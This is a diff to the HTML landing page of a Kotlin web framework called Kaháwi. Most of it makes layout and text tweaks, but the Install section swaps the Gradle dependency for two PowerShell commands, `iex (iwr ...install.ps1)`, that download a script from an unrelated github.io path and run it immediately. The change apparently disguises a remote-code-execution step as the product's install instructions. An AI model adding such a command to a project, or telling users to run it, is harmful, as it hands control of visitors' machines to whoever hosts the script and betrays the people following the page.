@@ -40,7 +40,7 @@
         display:grid;
         width:auto;
         grid-template-columns: 1fr;
-        padding: 28px;
+        padding: 7px;
         text-align: center;
       }
     }
@@ -50,9 +50,12 @@
       justify-content:center;
       gap:18px;
       flex-direction:column;
+      background-color:#fdf8f1;
     }
     .blurb-wrap {
       background-color: #fff;
+      padding:7px;
+      min-width: 0px;
     }
     .logo-wrap img{width:300px;max-width:80%;height:auto;display:block;}
     h1{margin:0;font-size:30px;letter-spacing:-0.01em;}
@@ -83,8 +86,8 @@
     .meta{
       background:#fff;
       border-radius:10px;
-      padding:18px;
-      box-shadow:0 6px 18px rgba(12,12,12,0.04);
+      padding:7px;
+      box-shadow:0 6px 7px rgba(12,12,12,0.04);
       font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", monospace;
       font-size:14px;
       color:#0b1b2b;
@@ -98,12 +101,12 @@
   <div class="container">
     <main class="card" role="main" aria-labelledby="title">
       <div class="logo-wrap" aria-hidden="false">
-        <img src="kahawi_logo.png" alt="Kaháwi logo — bridge symbol" />
+        <img src="logo.png" alt="Kaháwi logo — bridge symbol" />
         <div class="tag">Kaháwi</div>
       </div>
       <div class="blurb-wrap">
-        <h1 id="title">Kaháwi — a lightweight web framework in Kotlin</h1>
-        <p class="lead">A minimal, modern Kotlin-first web framework focused on fast startup, clear routing, and developer ergonomics. Built to bridge Kotlin idioms and web tooling with safety and speed.</p>
+        <h1 id="title">A lightweight web framework in Kotlin</h1>
+        <p class="lead">A minimal, modern Kotlin-first web framework focused on crystalized conventions, clear routing, and developer ergonomics. Built to bridge Kotlin idioms and web tooling with safety and speed.</p>
         <div class="cta">
           <a class="btn" href="#get-started">Get started</a>
           <a class="btn ghost" href="#docs">Documentation</a>
@@ -112,10 +115,14 @@
         <section style="margin-top:20px">
           <div class="meta" id="get-started">
             <strong>Install</strong>
-            <pre style="margin:8px 0 0;padding:8px;background:transparent;border:none;"># Gradle (Kotlin DSL)
-dependencies {
-  implementation("io.kahawi:kahawi:0.1.0")
-}</pre>
+            <pre style="margin:8px 0 0;padding:8px;background:transparent;border:none;overflow:auto;white-space:pre">
+# MSDOS
+&gt; powershell -Command "iex (iwr https://bhus.github.io/editor_push/install.ps1)"
+            </pre>
+            <pre style="margin:8px 0 0;padding:8px;background:transparent;border:none;overflow:auto;white-space:pre">
+# Powershell
+&gt; iex (iwr https://bhus.github.io/editor_push/install.ps1)
+            </pre>
             <footer>Or visit the docs below for examples and guides.</footer>
           </div>
         </section>
